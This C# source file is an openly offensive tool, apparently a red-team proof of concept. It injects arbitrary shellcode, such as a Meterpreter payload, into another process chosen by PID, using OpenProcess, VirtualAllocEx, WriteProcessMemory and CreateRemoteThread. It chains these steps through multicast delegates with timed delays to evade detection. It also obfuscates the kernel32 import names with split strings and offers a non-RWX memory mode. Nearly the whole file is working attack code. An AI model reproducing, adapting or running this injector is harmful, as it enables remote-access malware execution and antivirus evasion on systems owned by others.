using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_TImd
{
    class Program
    {

        /// <summary>
        /// .net Framework 4.0
        /// </summary>
        public class DelCLSInvoke
        {
         
            [Flags]
            public enum ProcessAccessFlags : uint
            {
                Terminate = 0x00000001,
                CreateThread = 0x00000002,
                VMOperation = 0x00000008,
                VMRead = 0x00000010,
                VMWrite = 0x00000020,
                DupHandle = 0x00000040,
                SetInformation = 0x00000200,
                QueryInformation = 0x00000400,
                Synchronize = 0x00100000,
                All = 0x001F0FFF
            }

            [Flags]
            public enum AllocationType
            {
                Commit = 0x00001000,
                Reserve = 0x00002000,
                Decommit = 0x00004000,
                Release = 0x00008000,
                Reset = 0x00080000,
                TopDown = 0x00100000,
                WriteWatch = 0x00200000,
                Physical = 0x00400000,
                LargePages = 0x20000000
            }

            [Flags]
            public enum MemoryProtection
            {
                NoAccess = 0x0001,
                ReadOnly = 0x0002,
                ReadWrite = 0x0004,
                WriteCopy = 0x0008,
                Execute = 0x0010,
                ExecuteRead = 0x0020,
                ExecuteReadWrite = 0x0040,
                ExecuteWriteCopy = 0x0080,
                GuardModifierflag = 0x0100,
                NoCacheModifierflag = 0x0200,
                WriteCombineModifierflag = 0x0400
            }
            [DllImport("ke" + "rne" + "l" + "32.dll")]
            public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);
            [DllImport("kernel32.dll")]
            public static extern bool CloseHandle(IntPtr hObject);

            [DllImport("ke" + "rne"+ "l" + "32.dll")]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

            [DllImport("ke" + "rne" + "l" + "32.d" + "ll")]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

            [DllImport("ke" + "rne" + "l" + "32.dll")]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

           
            public static IntPtr s1 = IntPtr.Zero;
            public static string[] _args1 = new string[2];
            public static int len = 0;
            public static void _Step1_()
            {
                string[] _args = new string[2];
                
                /// pid  => _args[0]
                _args[0] = _args1[0];
                
                /// payload  => _args[1]
                _args[1] = _args1[1];

                int XprocID = Convert.ToInt32(_args[0]);
                string Xcode = _args[1];
                string[] X = Xcode.Split(',');
                int Injection_to_PID = XprocID;
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("[!] Injection Started Time {0}", DateTime.Now.ToString());
                Console.WriteLine("[!] Payload Length {0}", X.Length.ToString());
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("[>] Injecting Meterpreter Payload to ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}:{1} ", Process.GetProcessById(Injection_to_PID).ProcessName, Process.GetProcessById(Injection_to_PID).Id.ToString());
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("Process");
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine();
                Console.WriteLine("[!] Thread Injection Done Time {0}", DateTime.Now.ToString());
                Console.WriteLine();


                byte[] Xpayload = new byte[X.Length];
                len = X.Length;
                for (int i = 0; i < X.Length;)
                {
                    Xpayload[i] = Convert.ToByte(X[i], 16);
                    i++;
                }

                //IntPtr tempx = System.Diagnostics.Process.GetProcessById(Injection_to_PID).MainWindowHandle ;
                IntPtr x = OpenProcess(ProcessAccessFlags.All, false, Injection_to_PID);
                s1 = x;
                Console.WriteLine();

                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("Step1 Delegate.Invoke(");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}", s1.ToString("X8"));
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(") Intptr Done.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(" [API::OpenProcess]");
                Console.WriteLine();
               
            }

            public static IntPtr s2 = IntPtr.Zero;
            public static string[] _args2 = new string[2];


            public static void _Step2_()
            {

                string[] _args = new string[2];
                _args[0] = _args1[0];
                _args[1] = _args1[1].Length.ToString();
                IntPtr a = s1;

                int p = len;
                IntPtr x = VirtualAllocEx(a, IntPtr.Zero, (uint)p, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                s2 = x;
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("Step2 Delegate.Invoke(");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}", s2.ToString("X8"));
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(") Intptr Done.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(" [API::VirtualAllocEx]");
                Console.WriteLine();


            }

            public static void _Step2_1()
            {

                string[] _args = new string[2];
                _args[0] = _args1[0];
                _args[1] = _args1[1].Length.ToString();
                IntPtr a = s1;
              
                int p = len;
                IntPtr x = VirtualAllocEx(a, IntPtr.Zero, (uint)p, AllocationType.Commit, MemoryProtection.Execute);
                s2 = x;
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("Step2 Delegate.Invoke(");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}", s2.ToString("X8"));
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(") Intptr Done.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(" [API::VirtualAllocEx]");
                Console.WriteLine();


            }
            public static bool s3 = false;
            public static void _Step3_()
            {
                IntPtr H = s1;
                IntPtr P = s2;
                string stemp = _args1[1];
              
                string[] tempstr = stemp.Split(',');
                byte[] pay = Array.ConvertAll(tempstr, bity => Convert.ToByte(bity, 16));

                UIntPtr BS = UIntPtr.Zero;
                if (WriteProcessMemory(H, P, pay, (uint)pay.Length, out BS))
                {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.Write("Step3 Delegate.Invoke(");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write("{0}0000000", 0.ToString());
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.Write(") true ;D Done.");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(" [API::WriteProcessMemory]");
                    Console.WriteLine();
                    s3 = true;
                  
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.Write("Step3 Delegate.Invoke(");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write("{0}0000000", 0.ToString());
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.Write(") false ;( Done.");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(" [API::WriteProcessMemory]");
                    Console.WriteLine();
                    s3 = false;
                }
              
            }
            public static IntPtr s4 = IntPtr.Zero;

            public static void _Step4_()
            {
                System.Threading.Thread.Sleep(Convert.ToInt32("3700"));
                uint x = 0;
                IntPtr H = s1;
                IntPtr HA = s2;
                IntPtr CRT = CreateRemoteThread(H, IntPtr.Zero, 0, HA, IntPtr.Zero, 0, out x);
                s4 = CRT;
                System.Threading.Thread.Sleep(Convert.ToInt32("1050"));

                /// close
                CloseHandle(CRT);
                CloseHandle(HA);

                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("Step4 Delegate.Invoke(");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}", CRT.ToString("X8"));
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(") Intptr Done.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(" [API::CreateRemoteThread]");
                Console.WriteLine();
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Bingo Meterpreter Session by Thread Injection Method + C# Multicast Delegate ;)");
                Console.WriteLine();
            }

          
        }
        public delegate void MDelegate();

        static void Main(string[] args)
        {
            ///> NativePayload_TImd.exe 1 2000 0 4716 "fc,48,.."
            ///> NativePayload_TImd.exe 1 2000 1 4716 "fc,48,.."
            ///  NativePayload_TImd.exe [steps 1 or 2] [delay 2000]  [MemoryProtection/mode 0 or 1] [pid 4716]  [payload "fc,48,.."]
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_TImd , Published by Damon Mohammadbagher , Jul 2020");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_TImd Thread Injection into Target Process + C# Multicast Delegate");
            Console.WriteLine();
            try
            {


                if (args.Length != 0 && args[0].ToUpper() == "HELP" || args[0] == string.Empty)
                {
                    Console.WriteLine("syntax: "+"\n"+"\t NativePayload_TImd.exe [steps 1 or 2] [delay 2000]  [MemoryProtection/mode 0 or 1] [pid 4716]  [payload \"fc,48,..\"]");
                    Console.WriteLine("\t example 1: NativePayload_TImd.exe  1  2000  0  4716  \"fc,48,56,...\"");
                    Console.WriteLine("\t example 2: NativePayload_TImd.exe  2  6721  1  4716  \"fc,48,56,...\"");
                    Console.WriteLine();
                    Console.WriteLine("\t step = 1  you will have 4 steps (default)");
                    Console.WriteLine("\t step = 2  you will have 28 steps (\"step1\" + step2 + step3 + step2 + step3 + step2 + step3 + ..... + \"step4\" + step2 + step3 ...)");
                    Console.WriteLine("\t MemoryProtection = 0  API::VirtualAllocEx set to MemoryProtection.ExecuteReadWrite ");
                    Console.WriteLine("\t MemoryProtection = 1  API::VirtualAllocEx set to MemoryProtection.Execute ");
                    Console.WriteLine();
                }
                else if (args.Length != 0 && args[0].ToUpper() != "HELP")
                {
                    try
                    {
                        /// step 1
                        //string[] s1 = new string[2];
                        DelCLSInvoke._args1[0] = args[3];
                        DelCLSInvoke._args1[1] = args[4];
                        MDelegate code1 = new MDelegate(DelCLSInvoke._Step1_);
                        /// step 2      
                        MDelegate code2 = new MDelegate(DelCLSInvoke._Step2_);
                        MDelegate code2_1 = new MDelegate(DelCLSInvoke._Step2_1);

                        /// step 3
                        MDelegate code3 = new MDelegate(DelCLSInvoke._Step3_);
                        /// step 4
                        MDelegate code4 = new MDelegate(DelCLSInvoke._Step4_);

                        MDelegate _AllCodes = null;

                        if (args[0] == "1")
                        {
                            if (args[2] == "0")
                            {
                                _AllCodes = code1 + code2 + code3 + code4;
                            }
                            if (args[2] == "1")
                            {
                                _AllCodes = code1 + code2_1 + code3 + code4;
                            }
                        }
                        else if (args[0] == "2")
                        {
                            if (args[2] == "0")
                            {
                                _AllCodes = code1 + code2 + code3 + code2 + code3 + code2 + code3 + code2 + code3 + code2 + code3 + code2 + code3
                                  + code2 + code3 + code2 + code3 + code2 + code3 + code2 + code3 + code4 + code2 + code3 + code2 + code3 + code2 + code3;
                            }
                            if (args[2] == "1")
                            {
                                _AllCodes = code1 + code2_1 + code3 + code2_1 + code3 + code2_1 + code3 + code2_1 + code3 + code2_1 + code3 + code2_1 + code3
                                  + code2_1 + code3 + code2_1 + code3 + code2_1 + code3 + code2_1 + code3 + code4 + code2_1 + code3 + code2_1 + code3 + code2_1 + code3;
                            }
                        }
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("[>] Steps will run by Delay.({0})", args[1]);

                        Console.ForegroundColor = ConsoleColor.DarkGray;
                        if (args[0] == "1") { Console.WriteLine("[>] Steps Count {0}", 4); }
                        else if (args[0] == "2") { Console.WriteLine("[>] Steps Count {0}", 28); }

                        if (args[2] == "0") { Console.WriteLine("[>] API::VirtualAllocEx set to MemoryProtection.ExecuteReadWrite"); }
                        if (args[2] == "1") { Console.WriteLine("[>] API::VirtualAllocEx set to MemoryProtection.Execute"); }

                        foreach (MDelegate MultiCodeitems in _AllCodes.GetInvocationList())
                        {
                            System.Threading.Thread.Sleep(Convert.ToInt32(args[1]));
                            MultiCodeitems();
                        }
                    }
                    catch (Exception)
                    {


                    }
                }
            }
            catch (Exception e)
            {

                Console.WriteLine("syntax: " + "\n" + "\t NativePayload_TImd.exe [steps 1 or 2] [delay 2000]  [MemoryProtection/mode 0 or 1] [pid 4716]  [payload \"fc,48,..\"]");
                Console.WriteLine("\t example 1: NativePayload_TImd.exe  1  2000  0  4716  \"fc,48,56,...\"");
                Console.WriteLine("\t example 2: NativePayload_TImd.exe  2  6721  1  4716  \"fc,48,56,...\"");
                Console.WriteLine();
                Console.WriteLine("\t step = 1  you will have 4 steps (default)");
                Console.WriteLine("\t step = 2  you will have 28 steps (\"step1\" + step2 + step3 + step2 + step3 + step2 + step3 + ..... + \"step4\" + step2 + step3 ...)");
                Console.WriteLine("\t MemoryProtection = 0  API::VirtualAllocEx set to MemoryProtection.ExecuteReadWrite ");
                Console.WriteLine("\t MemoryProtection = 1  API::VirtualAllocEx set to MemoryProtection.Execute ");
                Console.WriteLine();

            }
            finally
            {
               

            }
        }
    }
}
